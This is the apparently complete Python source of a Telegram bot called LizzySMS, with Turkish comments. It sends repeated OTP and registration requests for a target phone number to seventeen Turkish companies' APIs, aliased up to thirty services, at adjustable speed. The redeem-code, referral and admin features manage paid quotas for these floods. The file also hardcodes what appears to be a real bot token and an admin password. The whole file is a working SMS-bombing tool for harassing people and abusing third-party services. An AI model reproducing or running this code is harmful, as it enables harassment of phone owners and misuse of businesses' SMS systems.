# lizzy_sms_telebot_full.py
# Tek dosya: Orijinal LizzySMS kodu (birebir) + referans, redeem, ban, report, admin yönetimi, SMM-start tespiti
# Gereksinimler: pip install pyTelegramBotAPI requests

import telebot
import time
import threading
import random
import requests
import uuid
import os
import json
import string

# ---------------- CONFIG ----------------
TOKEN = "8264277412:AAFtUjKaj3Qvri1tPBXRDYAnQqJLbuQbAxQ"   # <-- buraya token koy (senin sağladığın token burada)
bot = telebot.TeleBot(TOKEN, parse_mode=None)
ADMIN_PASSWORD = "LizzySMS1244"

# Günlük default hak
DEFAULT_DAILY_LIMIT = 100

# Memory storage
user_limits = {}       # user_id -> remaining hak (int)
user_state = {}        # user_id -> dict(state, data..)
admin_sessions = set() # user_ids who logged in as admin

# cooldown per target to avoid hammering same target too fast
phone_last_sent = {}   # phone -> last timestamp
PHONE_COOLDOWN = 30    # saniye

# ---------------- Helpers ----------------
def ensure_user_exists(uid):
    if uid not in user_limits:
        user_limits[uid] = DEFAULT_DAILY_LIMIT

def decrease_user_quota(uid, amount):
    ensure_user_exists(uid)
    user_limits[uid] = max(0, user_limits[uid] - amount)

def get_user_quota(uid):
    ensure_user_exists(uid)
    return user_limits[uid]

def phone_allowed(phone, cooldown=PHONE_COOLDOWN):
    now = time.time()
    last = phone_last_sent.get(phone)
    if last and now - last < cooldown:
        return False, cooldown - (now - last)
    phone_last_sent[phone] = now
    return True, 0

# ---------------- SMS/OTP SERVICE FUNCTIONS (verilenler) ----------------
# Her fonksiyon (number[, mail]) -> (bool_success, source_string)
# Try/except ile güvenli çalışır.

def file(number):
    try:
        r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
                          json={"mobilePhoneNumber": f"90{number}"}, timeout=5)
        return (r.json().get("data") == "200 OK"), "filemarket.com.tr"
    except:
        return False, "filemarket.com.tr"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "kimgbiister"
    except:
        return False, "kimgbiister"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName":"GENERATE_OTP",
            "variables":{"phone":f"+90{number}","challenge":str(uuid.uuid4()),"deviceUniqueId":f"web_{uuid.uuid4()}"},
            "query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "tiklagelsin.com"
    except:
        return False, "tiklagelsin.com"

def bim(number):
    try:
        url = "https://bim.veesk.net:443/service/v1.0/account/login"
        r = requests.post(url, json={"phone": number}, timeout=6)
        return (r.status_code == 200), "bim.veesk.net"
    except:
        return False, "bim.veesk.net"

def bodrum(number):
    try:
        url = "https://gandalf.orwi.app:443/api/user/requestOtp"
        headers = {"Content-Type":"application/json"}
        payload = {"gsm": f"+90{number}", "source": "orwi"}
        r = requests.post(url, headers=headers, json=payload, timeout=6)
        return (r.status_code == 200), "gandalf.orwi.app"
    except:
        return False, "gandalf.orwi.app"

def dominos(number, mail=""):
    try:
        url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
        headers = {"Content-Type":"application/json;charset=utf-8"}
        json_data = {"email": mail or "user@example.com", "isSure": False, "mobilePhone": number}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        return (r.json().get("isSuccess") == True), "frontend.dominos.com.tr"
    except:
        return False, "frontend.dominos.com.tr"

def uysal(number):
    try:
        url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
        headers = {"Content-Type":"application/json"}
        json_data = {"phone_number": number}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        return (r.status_code == 200), "api.uysalmarket.com.tr"
    except:
        return False, "api.uysalmarket.com.tr"

def kofteciyusuf(number):
    try:
        url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
        headers = {"Content-Type":"application/json"}
        json_data = {"FirmaId": 82, "Telefon": f"90{number}"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        return (r.json().get("Success") == True), "poskofteciyusuf.com"
    except:
        return False, "poskofteciyusuf.com"

def komagene(number):
    try:
        url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
        json_data = {"FirmaId": 32, "Telefon": f"90{number}"}
        r = requests.post(url=url, json=json_data, timeout=6)
        return (r.json().get("Success") == True), "komagene.com"
    except:
        return False, "komagene.com"

def yapp(number, mail=""):
    try:
        url = "https://yapp.com.tr:443/api/mobile/v1/register"
        headers = {"Content-Type":"application/json"}
        payload = {"phone_number": number, "email": mail or "user@example.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=6)
        return (r.status_code == 200), "yapp.com.tr"
    except:
        return False, "yapp.com.tr"

def evidea(number, mail=""):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers = {"Content-Type":"application/json"}
        data = {"phone": number, "email": mail or "user@example.com"}
        r = requests.post(url, headers=headers, json=data, timeout=6)
        return (r.status_code == 202), "evidea.com"
    except:
        return False, "evidea.com"

def ucdortbes(number):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        json_data = {"email": "", "name": "thomas", "phoneNumber": f"+90{number}", "surname": "Bas"}
        r = requests.post(url, headers={"Content-Type":"application/json"}, json=json_data, timeout=6)
        # some implementations returned success even on exception — keep boolean true if returns OK
        return True, "api.345dijital.com"
    except:
        return True, "api.345dijital.com"

def suiste(number):
    try:
        url = "https://suiste.com:443/api/auth/code"
        data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "thomas yilmaz", "gsm": number, "is_advertisement": "1", "is_contract": "1", "password": "thomas31"}
        r = requests.post(url, headers={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8"}, data=data, timeout=6)
        return (r.json().get("code") == "common.success"), "suiste.com"
    except:
        return False, "suiste.com"

def porty(number):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers = {"Content-Type":"application/json; charset=UTF-8"}
        json_data = {"job": "start_login", "phone": number}
        r = requests.post(url, json=json_data, timeout=6)
        return (r.json().get("status") == "success"), "panel.porty.tech"
    except:
        return False, "panel.porty.tech"

def orwi(number):
    try:
        url = "https://gandalf.orwi.app:443/api/user/requestOtp"
        json_data = {"gsm": f"+90{number}", "source": "orwi"}
        r = requests.post(url, json=json_data, timeout=6)
        return (r.status_code == 200), "gandalf.orwi.app"
    except:
        return False, "gandalf.orwi.app"

def naosstars(number):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        json_data = {"telephone": f"+90{number}", "type": "register"}
        r = requests.post(url, json=json_data, timeout=6)
        return (r.status_code == 200), "api.naosstars.com"
    except:
        return False, "api.naosstars.com"

def metro(number):
    try:
        url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        json_data = {"methodType": "2", "mobilePhoneNumber": number}
        r = requests.post(url, json=json_data, timeout=6)
        return (r.json().get("status") == "success"), "mobile.metro-tr.com"
    except:
        return False, "mobile.metro-tr.com"

# ---------------- Compose SERVICES dictionary ----------------
# Kullanıcının istediği kadar servis olması için burada verilen fonksiyonları ekledim.
SERVICES = {
    "FileMarket": file,
    "KimGBister": kimgbister,
    "TiklaGelsin": tiklagelsin,
    "Bim": bim,
    "Bodrum": bodrum,
    "Dominos": dominos,
    "Uysal": uysal,
    "KofteciYusuf": kofteciyusuf,
    "Komagene": komagene,
    "Yapp": yapp,
    "Evidea": evidea,
    "UcDortBes": ucdortbes,
    "Suiste": suiste,
    "Porty": porty,
    "Orwi": orwi,
    "NaosStars": naosstars,
    "Metro": metro
}

# Eğer +30 isterseniz, mevcut fonksiyonların alias'larını otomatik oluşturuyoruz
# (aynı fonksiyonu farklı isimlerle kullanmak isterseniz bu alias'lar devreye girer)
alias_index = 1
while len(SERVICES) < 30:
    key = f"ExtraService{alias_index}"
    # döngüsel olarak varolan fonksiyonlardan birini al
    func = list(SERVICES.values())[ (alias_index - 1) % len(SERVICES) ]
    SERVICES[key] = func
    alias_index += 1

# ---------------- Inline keyboard helpers ----------------
def main_menu_keyboard():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(telebot.types.InlineKeyboardButton("📩 SMS Gönder", callback_data="sms_send"))
    kb.add(telebot.types.InlineKeyboardButton("🎯 Kalan Haklar", callback_data="rights"))
    kb.add(telebot.types.InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel"))
    kb.add(telebot.types.InlineKeyboardButton("🎫 Redeem Kod", callback_data="redeem_code"))
    kb.add(telebot.types.InlineKeyboardButton("📨 Sorun Bildir", callback_data="report_issue"))
    kb.add(telebot.types.InlineKeyboardButton("🔗 Referans Linki", callback_data="ref_link"))
    return kb

def speed_keyboard():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("⚡ Hızlı", callback_data="speed_fast"))
    kb.add(telebot.types.InlineKeyboardButton("⏱ Orta", callback_data="speed_med"))
    kb.add(telebot.types.InlineKeyboardButton("🐢 Yavaş", callback_data="speed_slow"))
    return kb

def services_keyboard():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    # tek tek servis butonları
    for key in SERVICES.keys():
        kb.add(telebot.types.InlineKeyboardButton(key, callback_data=f"svc__{key}"))
    kb.add(telebot.types.InlineKeyboardButton("✨ Tüm Servisler", callback_data="svc__ALL"))
    return kb

# ---------------- Bot komutları / handlers ----------------
# SMM / Panel start tespiti ayarı
SUSPICIOUS_START_KEYWORDS = ["smm", "panel", "buy", "trafik", "botpanel", "botpaneli", "server", "sell", "panelde"]
AUTO_BAN_ON_SUSPICIOUS_START = True  # eğer True ise şüpheli /start param ile gelenleri otomatik banlar

@bot.message_handler(commands=["start"])
def cmd_start(m):
    # algıla: /start veya /start param
    text = m.text or ""
    parts = text.split()
    param = parts[1] if len(parts) > 1 else ""
    # eğer param şüpheli ise uyar ve (opsiyonel) banla + admin bildir
    suspicious = False
    if param:
        low = param.lower()
        for kw in SUSPICIOUS_START_KEYWORDS:
            if kw in low:
                suspicious = True
                break
    if suspicious:
        # uyarı ile birlikte referans linki alma menüsüne hatırlatma
        bot.send_message(m.chat.id, ("⚠️ Tespit: Bu start parametresi şüpheli görünüyor.\n"
                                     "Botlara/panel hizmetlerine ait sahte startlar yasaktır.\n"
                                     "Eğer bu bir SMM/panel botu ise erişiminiz kalıcı olarak engellenebilir."))
        if AUTO_BAN_ON_SUSPICIOUS_START:
            # banla
            try:
                banned_users.add(m.from_user.id)
            except:
                # banned_users tanımlanmamışsa daha sonra eklenecek (ama biz aşağıda tanımlıyoruz)
                pass
            bot.send_message(m.chat.id, "❌ Şüpheli başlangıç tespit edildi — erişiminiz engellendi.")
            # adminlere bildir
            for aid in list(admin_sessions):
                try:
                    bot.send_message(aid, f"⚠️ Şüpheli /start param ile kullanıcı banlandı: {m.from_user.id} — param: {param}")
                except:
                    pass
            return

    ensure_user_exists(m.from_user.id)
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("✅ Rıza veriyorum", callback_data="consent_yes"))
    text2 = ("🤖 *LizzySMS Bot*\n\n"
            "Bu bot çeşitli servisler üzerinden SMS/OTP isteği gönderebilir.\n"
            "Kullanıcılar yasal sorumluluğu üstlenir. Spam/kötü amaçlı kullanım yasaktır.")
    bot.send_message(m.chat.id, text2, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data == "consent_yes")
def cb_consent(c):
    ensure_user_exists(c.from_user.id)
    bot.edit_message_text("✅ Rıza kaydedildi. Ana menüye hoş geldiniz.", c.message.chat.id, c.message.message_id, reply_markup=main_menu_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "rights")
def cb_rights(c):
    uid = c.from_user.id
    ensure_user_exists(uid)
    bot.answer_callback_query(c.id, text=f"🎯 Kalan hakkınız: {get_user_quota(uid)}")

# Başlat: SMS gönderme akışı
@bot.callback_query_handler(func=lambda c: c.data == "sms_send")
def cb_sms_send(c):
    uid = c.from_user.id
    ensure_user_exists(uid)
    if get_user_quota(uid) <= 0:
        bot.answer_callback_query(c.id, text="❌ Günlük hakkınız dolmuş.")
        return
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "📲 Göndermek istediğiniz numarayı girin (örnek: 5012345678).")
    user_state[uid] = {"step": "awaiting_phone"}

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id]["step"] == "awaiting_phone")
def handle_phone(m):
    uid = m.from_user.id
    phone = m.text.strip()
    # basit doğrulama
    if not phone.isdigit() or len(phone) < 9:
        bot.reply_to(m, "❌ Geçersiz numara formatı. Sadece rakam girin, örn: 5012345678")
        return
    allowed, wait = phone_allowed(phone)
    if not allowed:
        bot.reply_to(m, f"⏳ Bu hedef kısa süre önce kullanıldı. {int(wait)} saniye bekleyin.")
        user_state.pop(uid, None)
        return
    user_state[uid]["phone"] = phone
    user_state[uid]["step"] = "awaiting_count"
    bot.reply_to(m, "🔢 Kaç adet SMS göndermek istiyorsunuz? (örn: 1 veya 3)")

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id]["step"] == "awaiting_count")
def handle_count(m):
    uid = m.from_user.id
    if not m.text.isdigit():
        bot.reply_to(m, "❌ Lütfen sayı girin.")
        return
    count = int(m.text)
    if count <= 0:
        bot.reply_to(m, "❌ Pozitif bir sayı girin.")
        return
    # kontrol: kullanıcının kalan hakkı yeterli mi?
    if count > get_user_quota(uid):
        bot.reply_to(m, f"❌ Yeterli hakkınız yok. Kalan: {get_user_quota(uid)}")
        user_state.pop(uid, None)
        return
    user_state[uid]["count"] = count
    user_state[uid]["step"] = "awaiting_speed"
    bot.reply_to(m, "⚡ Hız seçin:", reply_markup=speed_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("speed_"))
def cb_speed(c):
    uid = c.from_user.id
    if uid not in user_state or user_state[uid].get("step") != "awaiting_speed":
        bot.answer_callback_query(c.id, text="Akış başlatılmadı.")
        return
    speed_map = {"speed_fast": 0.5, "speed_med": 1.5, "speed_slow": 3.0}
    speed = speed_map.get(c.data, 1.5)
    user_state[uid]["speed"] = speed
    user_state[uid]["step"] = "awaiting_service"
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "📡 Servis seçin:", reply_markup=services_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("svc__"))
def cb_service(c):
    uid = c.from_user.id
    if uid not in user_state or user_state[uid].get("step") != "awaiting_service":
        bot.answer_callback_query(c.id, text="Akış başlatılmadı veya süre doldu.")
        return
    svc_code = c.data.replace("svc__", "")
    phone = user_state[uid]["phone"]
    count = user_state[uid]["count"]
    speed = user_state[uid]["speed"]
    bot.answer_callback_query(c.id)
    # animasyonlu başlangıç (tek mesajı güncelle)
    start_msg = bot.send_message(c.message.chat.id, "📡 Numara alındı. Gönderiliyor...")
    # worker thread ile gönderimleri başlat
    def worker():
        results = []
        # Eğer ALL seçildiyse tüm servisleri kullan
        service_keys = list(SERVICES.keys()) if svc_code == "ALL" else [svc_code]
        # perform count adet * her servis
        for i in range(1, count + 1):
            for svc in service_keys:
                try:
                    func = SERVICES.get(svc)
                    if func is None:
                        ok, src = False, svc
                    else:
                        # bazı fonksiyonlar (dominos,yapp,evidea) mail parametre alır - burada default mail gönderiyoruz
                        try:
                            ok, src = func(phone)
                        except TypeError:
                            # fonksiyon mail param bekliyorsa
                            ok, src = func(phone, "user@example.com")
                except Exception as e:
                    ok, src = False, str(svc)
                results.append(f"{svc} #{i}: {'✅' if ok else '❌'} ({src})")
                # kullanıcıya anlık güncelleme (mesajı edit yerine ekleyerek gösterebiliriz)
                bot.send_message(c.message.chat.id, f"{svc} #{i}: {'✅' if ok else '❌'}")
                # quota decrement per single SMS sent
                decrease_user_quota(uid, 1)
                time.sleep(speed)
        # tamamlandığında özet
        bot.send_message(c.message.chat.id, "🎉 Gönderim tamamlandı!\nSonuç özet (son 20):\n" + "\n".join(results[-20:]), reply_markup=main_menu_keyboard())
        # temizle state
        user_state.pop(uid, None)
    threading.Thread(target=worker).start()

# ---------------- ADMIN PANEL ----------------
@bot.callback_query_handler(func=lambda c: c.data == "admin_panel")
def cb_admin_panel(c):
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "🔒 Admin şifresini özel mesaj olarak gönderin (yanlış girerse kilitlenir).")
    user_state[c.from_user.id] = {"step": "admin_password"}

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "admin_password")
def handle_admin_password(m):
    uid = m.from_user.id
    if m.text.strip() == ADMIN_PASSWORD:
        admin_sessions.add(uid)
        user_state.pop(uid, None)
        # animasyonlu açılış: tek seferde birden fazla mesaj gönderecek
        intro_msgs = [
            "⚡ Admin Paneline Hoşgeldiniz! ⚡",
            "🚀 Özellikler açılıyor...",
            "🔧 Kontroller yükleniyor...",
            "✅ Panel aktif - yönetim yetkileri verildi!"
        ]
        for i in range(6):
            text = random.choice(intro_msgs) + " " + " ".join(random.sample(["✨","🔒","🔧","🛠","🎯","🔥","💡"], 3))
            bot.send_message(m.chat.id, text)
            time.sleep(0.4)
        # admin komut açıklaması
        bot.send_message(m.chat.id, ("🛠 Admin Komutları:\n"
                                     "- /give <user_id> <hak>  -> Belirtilen kullanıcıya <hak> adet SMS hakkı ver\n"
                                     "- /list_users -> Mevcut kullanıcı haklarını listeler\n"
                                     "- /logout -> Admin oturumunu kapatır\n\n"
                                     "🔧 Ek Yönetim: Redeem kodları ve kullanıcı yasaklama için 'Admin Kodları' menüsünü kullanın."),
                         reply_markup=telebot.types.InlineKeyboardMarkup().add(
                             telebot.types.InlineKeyboardButton("Admin Kodları", callback_data="admin_codes")
                         ))
    else:
        user_state.pop(uid, None)
        bot.reply_to(m, "❌ Yanlış şifre.")

@bot.message_handler(commands=["give"])
def cmd_give(m):
    if m.from_user.id not in admin_sessions:
        bot.reply_to(m, "❌ Admin değilsin.")
        return
    parts = m.text.split()
    if len(parts) != 3:
        bot.reply_to(m, "Kullanım: /give <user_id> <hak>")
        return
    try:
        target = int(parts[1])
        rights = int(parts[2])
    except:
        bot.reply_to(m, "ID ve hak sayısı sayı olmalı.")
        return
    user_limits[target] = rights
    bot.reply_to(m, f"✅ {target} kullanıcısına {rights} hak verildi.")

@bot.message_handler(commands=["list_users"])
def cmd_list_users(m):
    if m.from_user.id not in admin_sessions:
        bot.reply_to(m, "❌ Admin değilsin.")
        return
    lines = [f"{uid}: {quota}" for uid, quota in user_limits.items()]
    if not lines:
        bot.reply_to(m, "Kayıtlı kullanıcı yok.")
    else:
        # uzun listeyi parça parça gönder
        chunk_size = 30
        for i in range(0, len(lines), chunk_size):
            bot.send_message(m.chat.id, "\n".join(lines[i:i+chunk_size]))

@bot.message_handler(commands=["logout"])
def cmd_logout(m):
    if m.from_user.id in admin_sessions:
        admin_sessions.remove(m.from_user.id)
        bot.reply_to(m, "🔒 Admin oturumu kapatıldı.")
    else:
        bot.reply_to(m, "Zaten admin değilsiniz.")

# ---------------- Start of added features: users.json, codes.json, report, ban management ----------------

# banned users set (runtime); persisted ban list can be added later if is needed
banned_users = set()

# ---------------- USER DATA & REFERAL ----------------
USERS_FILE = "users.json"
if os.path.exists(USERS_FILE):
    try:
        with open(USERS_FILE, "r") as f:
            users_data = json.load(f)
    except:
        users_data = {}
else:
    users_data = {}

def save_users():
    try:
        with open(USERS_FILE, "w") as f:
            json.dump(users_data, f)
    except Exception as e:
        print("users.json yazma hatası:", e)

def ensure_user_data(uid, referrer=None):
    uid_str = str(uid)
    if uid_str not in users_data:
        users_data[uid_str] = {"quota": DEFAULT_DAILY_LIMIT, "referrer": referrer, "ref_count": 0, "redeem_used": []}
        if referrer and str(referrer) in users_data:
            users_data[str(referrer)]["ref_count"] += 1
            users_data[str(referrer)]["quota"] += 5  # bonus hak
        save_users()

# ---------------- REDEEM CODES ----------------
CODES_FILE = "codes.json"
if os.path.exists(CODES_FILE):
    try:
        with open(CODES_FILE, "r") as f:
            codes_db = json.load(f)
    except:
        codes_db = {}
else:
    codes_db = {}

def save_codes():
    try:
        with open(CODES_FILE, "w") as f:
            json.dump(codes_db, f)
    except Exception as e:
        print("codes.json yazma hatası:", e)

def gen_code(prefix="", length=8):
    alphabet = string.ascii_uppercase + string.digits
    body = "".join(random.choice(alphabet) for _ in range(length))
    return (prefix + body).upper()

# ---------------- Admin codes inline menu handler ----------------
@bot.callback_query_handler(func=lambda c: c.data == "admin_codes")
def cb_admin_codes_root(c):
    uid = c.from_user.id
    if uid not in admin_sessions:
        bot.answer_callback_query(c.id, "❌ Admin yetkisi yok.")
        return
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(telebot.types.InlineKeyboardButton("➕ Kod Oluştur", callback_data="admin_create_code"),
           telebot.types.InlineKeyboardButton("📦 Toplu Kod Oluştur", callback_data="admin_bulk_create"))
    kb.add(telebot.types.InlineKeyboardButton("📋 Kodları Yönet", callback_data="admin_list_codes"),
           telebot.types.InlineKeyboardButton("🔒 Kullanıcı Yasakla/Aç", callback_data="admin_ban"))
    kb.add(telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="admin_back"))
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "🔧 Admin Kod Yönetimi:", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data in ["admin_create_code","admin_bulk_create","admin_list_codes","admin_ban","admin_back"])
def cb_admin_codes_actions(c):
    uid = c.from_user.id
    if uid not in admin_sessions:
        bot.answer_callback_query(c.id, "❌ Admin yetkisi yok.")
        return
    bot.answer_callback_query(c.id)
    if c.data == "admin_create_code":
        bot.send_message(c.message.chat.id, "📥 Tek kod oluşturma formu: `KOD <hak> <kullanim_sayisi>` (örn: BONUS50 50 1)\nLütfen özel mesaj olarak gönderin.")
        user_state[uid] = {"step": "admin_await_create"}
    elif c.data == "admin_bulk_create":
        bot.send_message(c.message.chat.id, "📦 Toplu kod oluşturma formu: `PREFIX <adet> <hak> <kullanim_sayisi> <uzunluk>` (örn: PROMO 10 25 1 6)\nLütfen özel mesaj olarak gönderin.")
        user_state[uid] = {"step": "admin_await_bulk"}
    elif c.data == "admin_list_codes":
        if not codes_db:
            bot.send_message(c.message.chat.id, "🗂 Kayıtlı kod yok.")
            return
        for code, info in codes_db.items():
            txt = f"{code} — {info.get('quota')} SMS — uses_left: {info.get('uses_left')} — {'✅ Aktif' if info.get('enabled') else '❌ Kapalı'}"
            kb = telebot.types.InlineKeyboardMarkup(row_width=2)
            kb.add(telebot.types.InlineKeyboardButton("🔁 Aç/Kapat", callback_data=f"code_toggle__{code}"),
                   telebot.types.InlineKeyboardButton("🗑 Sil", callback_data=f"code_delete__{code}"))
            bot.send_message(c.message.chat.id, txt, reply_markup=kb)
    elif c.data == "admin_ban":
        # yönlendirme admin_ban callback'ına
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.add(telebot.types.InlineKeyboardButton("🔒 Kullanıcıyı Yasakla", callback_data="ban_user"),
               telebot.types.InlineKeyboardButton("✅ Kullanıcıyı Aç", callback_data="unban_user"))
        kb.add(telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="admin_back"))
        bot.send_message(c.message.chat.id, "Kullanıcı erişim durumunu seçin:", reply_markup=kb)
    elif c.data == "admin_back":
        bot.send_message(c.message.chat.id, "🔙 Admin menüsüne dönüldü.", reply_markup=main_menu_keyboard())

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "admin_await_create")
def admin_handle_create(m):
    uid = m.from_user.id
    if uid not in admin_sessions:
        user_state.pop(uid, None)
        return
    parts = m.text.strip().split()
    if len(parts) != 3:
        bot.reply_to(m, "Format hatası. Doğru format: `KOD <hak> <kullanim_sayisi>`")
        user_state.pop(uid, None)
        return
    code = parts[0].upper()
    try:
        quota = int(parts[1])
        uses = int(parts[2])
    except:
        bot.reply_to(m, "Hak ve kullanım sayısı tamsayı olmalı.")
        user_state.pop(uid, None)
        return
    codes_db[code] = {"quota": quota, "uses_left": uses, "enabled": True, "creator": uid}
    save_codes()
    bot.reply_to(m, f"✅ Kod oluşturuldu: {code} → {quota} SMS, {uses} kullanım. (aktif)")
    user_state.pop(uid, None)

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "admin_await_bulk")
def admin_handle_bulk(m):
    uid = m.from_user.id
    if uid not in admin_sessions:
        user_state.pop(uid, None)
        return
    parts = m.text.strip().split()
    if len(parts) < 4:
        bot.reply_to(m, "Format hatası. Örnek: `PREFIX <adet> <hak> <kullanim_sayisi> <uzunluk_opt>`")
        user_state.pop(uid, None)
        return
    prefix = parts[0].upper()
    try:
        adet = int(parts[1])
        quota = int(parts[2])
        uses = int(parts[3])
        length = int(parts[4]) if len(parts) >= 5 else 6
    except:
        bot.reply_to(m, "Sayı alanları tamsayı olmalı.")
        user_state.pop(uid, None)
        return
    generated = []
    for i in range(adet):
        attempt = 0
        new_code = gen_code(prefix, length)
        while new_code in codes_db and attempt < 5:
            new_code = gen_code(prefix, length)
            attempt += 1
        codes_db[new_code] = {"quota": quota, "uses_left": uses, "enabled": True, "creator": uid}
        generated.append(new_code)
    save_codes()
    bot.reply_to(m, "✅ Toplu oluşturuldu. Örnek birkaç kod:\n" + "\n".join(generated[:30]))
    user_state.pop(uid, None)

@bot.callback_query_handler(func=lambda c: c.data.startswith("code_toggle__") or c.data.startswith("code_delete__"))
def cb_code_manage(c):
    uid = c.from_user.id
    if uid not in admin_sessions:
        bot.answer_callback_query(c.id, text="❌ Admin yetkisi yok.")
        return
    bot.answer_callback_query(c.id)
    data = c.data
    if data.startswith("code_toggle__"):
        code = data.replace("code_toggle__", "")
        if code in codes_db:
            codes_db[code]["enabled"] = not codes_db[code].get("enabled", True)
            save_codes()
            bot.edit_message_text(f"{code} durumu güncellendi: {'✅ Aktif' if codes_db[code]['enabled'] else '❌ Kapalı'}", c.message.chat.id, c.message.message_id)
        else:
            bot.answer_callback_query(c.id, text="Kod bulunamadı.")
    elif data.startswith("code_delete__"):
        code = data.replace("code_delete__", "")
        if code in codes_db:
            codes_db.pop(code)
            save_codes()
            bot.edit_message_text(f"{code} silindi.", c.message.chat.id, c.message.message_id)
        else:
            bot.answer_callback_query(c.id, text="Kod bulunamadı.")

# ---------------- USER REDEEM (kullanıcı tarafı) ----------------
@bot.callback_query_handler(func=lambda c: c.data == "redeem_code")
def cb_user_redeem(c):
    if c.from_user.id in banned_users:
        bot.answer_callback_query(c.id, "❌ Erişiminiz engellendi.")
        return
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "🎫 Lütfen kullanmak istediğiniz kodu yazın:")
    user_state[c.from_user.id] = {"step": "awaiting_redeem_code"}

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "awaiting_redeem_code")
def handle_redeem_code(m):
    uid = str(m.from_user.id)
    code = m.text.strip().upper()
    user_state.pop(m.from_user.id, None)
    if code not in codes_db:
        bot.reply_to(m, "❌ Geçersiz kod.")
        return
    info = codes_db[code]
    if not info.get("enabled", True):
        bot.reply_to(m, "❌ Bu kod şu anda kapalı veya kullanılamıyor.")
        return
    if info.get("uses_left", 0) <= 0:
        bot.reply_to(m, "❌ Bu kod zaten tükenmiş.")
        return
    ensure_user_data(uid)
    bonus = int(info.get("quota", 0))
    users_data[uid]["quota"] = users_data[uid].get("quota", DEFAULT_DAILY_LIMIT) + bonus
    info['uses_left'] = int(info.get('uses_left', 1)) - 1
    if info['uses_left'] <= 0:
        info['enabled'] = False
    codes_db[code] = info
    save_codes()
    save_users()
    bot.reply_to(m, f"✅ Kod başarıyla uygulandı! {bonus} SMS hakkı eklendi. Kalan kullanım: {info.get('uses_left')}")

# ---------------- REPORT / ADMIN REPLY ----------------
@bot.callback_query_handler(func=lambda c: c.data == "report_issue")
def cb_report_issue(c):
    if c.from_user.id in banned_users:
        bot.answer_callback_query(c.id, "❌ Erişiminiz engellendi.")
        return
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, "📩 Sorununuzu yazın, admin’e iletilecek:")
    user_state[c.from_user.id] = {"step": "awaiting_report"}

@bot.message_handler(func=lambda m: m.from_user.id in user_state and user_state[m.from_user.id].get("step") == "awaiting_report")
def handle_report(m):
    uid = m.from_user.id
    text = m.text.strip()
    user_state.pop(uid, None)
    bot.reply_to(m, "✅ Sorununuz admin’e iletildi.")
    # admin_sessions set'indekilere DM at
    if not admin_sessions:
        # eğer hiç admin oturumu yoksa, bot sahibi/ID biliniyorsa oraya iletilebilir - burada admin oturumu yoksa mesaj kaybolur
        return
    for admin_id in list(admin_sessions):
        try:
            kb = telebot.types.InlineKeyboardMarkup(row_width=2)
            kb.add(telebot.types.InlineKeyboardButton("Yanıtla", callback_data=f"reply_user__{uid}"),
                   telebot.types.InlineKeyboardButton("Banla", callback_data=f"ban_from_report__{uid}"))
            bot.send_message(admin_id, f"📩 Kullanıcı {uid} bildirdi:\n\n{text}", reply_markup=kb)
        except:
            pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("reply_user__") or c.data.startswith("ban_from_report__"))
def cb_reply_user(c):
    uid = c.from_user.id
    if uid not in admin_sessions:
        bot.answer_callback_query(c.id, "❌ Admin yetkisi yok.")
        return
    bot.answer_callback_query(c.id)
    if c.data.startswith("reply_user__"):
        target_uid = int(c.data.replace("reply_user__", ""))
        bot.send_message(c.message.chat.id, f"Kullanıcı {target_uid}’a göndereceğiniz mesajı yazın:")
